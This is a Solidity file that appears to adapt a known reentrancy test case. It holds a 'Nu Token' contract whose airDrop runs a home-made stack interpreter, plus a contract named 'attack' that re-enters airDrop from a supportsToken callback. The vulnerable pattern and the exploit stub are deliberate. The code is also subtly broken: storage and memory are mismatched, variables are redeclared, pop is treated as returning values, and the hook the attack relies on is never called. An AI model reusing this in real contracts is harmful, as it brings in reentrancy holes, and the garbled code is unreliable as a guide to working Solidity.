pragma solidity ^0.4.24;

contract ModifierEntrancy {
    mapping (address => uint) public tokenBalance;
    string constant name = "Nu Token";

    enum Instruction { PUSH, POP, ADD, SUB, JMP, JZ, LOAD, STORE, CALL }
    
    struct VM {
        uint[] stack;
        uint pc;
        bytes32[] program;
    }

    function execute(VM storage vm) internal {
        while (vm.pc < vm.program.length) {
            Instruction instr = Instruction(uint(vm.program[vm.pc]));
            vm.pc++;

            if (instr == Instruction.PUSH) {
                uint value = uint(vm.program[vm.pc]);
                vm.stack.push(value);
                vm.pc++;
            } else if (instr == Instruction.POP) {
                vm.stack.pop();
            } else if (instr == Instruction.ADD) {
                uint b = vm.stack.pop();
                uint a = vm.stack.pop();
                vm.stack.push(a + b);
            } else if (instr == Instruction.SUB) {
                uint b = vm.stack.pop();
                uint a = vm.stack.pop();
                vm.stack.push(a - b);
            } else if (instr == Instruction.JMP) {
                uint target = vm.stack.pop();
                vm.pc = target;
            } else if (instr == Instruction.JZ) {
                uint target = vm.stack.pop();
                uint cond = vm.stack.pop();
                if (cond == 0) {
                    vm.pc = target;
                }
            } else if (instr == Instruction.LOAD) {
                uint addr = vm.stack.pop();
                vm.stack.push(tokenBalance[address(addr)]);
            } else if (instr == Instruction.STORE) {
                uint addr = vm.stack.pop();
                uint value = vm.stack.pop();
                tokenBalance[address(addr)] = value;
            } else if (instr == Instruction.CALL) {
                address addr = address(vm.stack.pop());
                bytes32 sig = vm.program[vm.pc];
                vm.pc++;
                require(sig == keccak256(abi.encodePacked("airDrop()")));
                this.airDrop();
            }
        }
    }

    function airDrop() public {
        VM memory vm;
        vm.program = new bytes32[](10);
        vm.program[0] = bytes32(uint(Instruction.LOAD));
        vm.program[1] = bytes32(uint(msg.sender));
        vm.program[2] = bytes32(uint(Instruction.JZ));
        vm.program[3] = bytes32(uint(8));
        vm.program[4] = bytes32(uint(Instruction.PUSH));
        vm.program[5] = bytes32(uint(20));
        vm.program[6] = bytes32(uint(Instruction.ADD));
        vm.program[7] = bytes32(uint(Instruction.STORE));
        vm.program[8] = bytes32(uint(msg.sender));
        vm.program[9] = bytes32(uint(Instruction.POP));
        
        execute(vm);
    }
}

contract Bank {
    function supportsToken() external pure returns(bytes32) {
        return (keccak256(abi.encodePacked("Nu Token")));
    }
}

contract attack {  
    bool hasBeenCalled;
    function supportsToken() external returns(bytes32) {
        if (!hasBeenCalled) {
            hasBeenCalled = true;
            ModifierEntrancy(msg.sender).airDrop();
        }
        return (keccak256(abi.encodePacked("Nu Token")));
    }
    function call(address token) public {
        ModifierEntrancy(token).airDrop();
    }
}